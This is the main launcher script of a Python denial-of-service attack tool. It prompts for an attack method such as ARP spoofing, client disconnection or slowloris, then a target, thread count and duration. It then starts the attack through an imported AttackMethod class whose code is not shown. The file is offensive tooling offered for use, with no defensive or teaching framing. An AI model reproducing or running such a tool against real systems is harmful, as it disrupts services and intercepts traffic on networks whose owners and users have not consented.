"""Main script to start GUI DoS attack application."""

# -*- coding: utf-8 -*-
import os
import sys

from colorama import Fore

os.chdir(os.path.dirname(os.path.realpath(__file__)))
os.system("cls" if os.name == "nt" else "clear")

try:
    from tools.addons.checks import (check_http_target_input,
                                     check_local_target_input,
                                     check_method_input, check_number_input)
    from tools.addons.ip_tools import show_local_host_ips
    from tools.addons.logo import show_logo
    from tools.method import AttackMethod
except (ImportError, NameError) as err:
    print("\nFailed to import something", err)


def main() -> None:
    """Run main application."""
    show_logo()
    try:
        if (method := check_method_input()) in ["arp-spoof", "disconnect"]:
            show_local_host_ips()
        target = (
            check_http_target_input()
            if method not in ["arp-spoof", "disconnect"]
            else check_local_target_input()
        )
        threads = (
            check_number_input("threads")
            if method not in ["arp-spoof", "disconnect"]
            else 1
        )
        time = check_number_input("time")
        sleep_time = check_number_input("sleep time") if "slowloris" in method else 0

        with AttackMethod(
            duration=time,
            method_name=method,
            threads=threads,
            target=target,
            sleep_time=sleep_time,
        ) as attack:
            attack.start()
    except KeyboardInterrupt:
        print(
            f"\n\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Program closed.\n\n{Fore.RESET}"
        )
        sys.exit(1)


if __name__ == "__main__":
    main()
